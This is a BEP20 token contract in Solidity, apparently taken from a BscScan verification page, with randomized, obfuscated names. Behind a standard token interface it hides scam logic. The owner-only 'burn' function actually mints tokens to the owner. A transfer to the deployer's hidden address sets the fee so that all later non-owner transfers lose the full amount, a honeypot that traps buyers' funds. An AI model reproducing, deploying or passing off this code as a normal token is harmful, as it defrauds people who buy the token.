/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract nVrArY {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  VImAjc = 10000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  MGdTNA = address(0);
uint256 public  kjArfi = 1000000000000000000;
address public  kpwEeF = address(0);
address public  HiVywp = address(0);
uint256 public  VIcsfy = 100000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  symbol = "CwWegM";
address public  LEPwTZ = address(0);
uint256 public  UCBrUl = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant jPnqNP = 9+1;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  zpqxOK = 10000000000000000;
address public owner;
uint256 private  XnqIed = 10000000000000;
string public  name = "lXFcGe";
address public  uBHIEZ = address(0);
address public  fcxDQw = address(0);
uint256 public  awnlAK = 100000000000000000000000;
uint256 public  SUWQus = 10000000000000000000000000000;
address public  zALgQl = address(0);
uint8 public constant decimals = 18;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 public  FCFfhS = 100000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TpXUII");
require(to != address(0), "TpXUII");
require(amount <= balanceOf[from], "TpXUII");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* jPnqNP/XnqIed ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MGdTNA){
XnqIed = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor ()  {
MGdTNA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}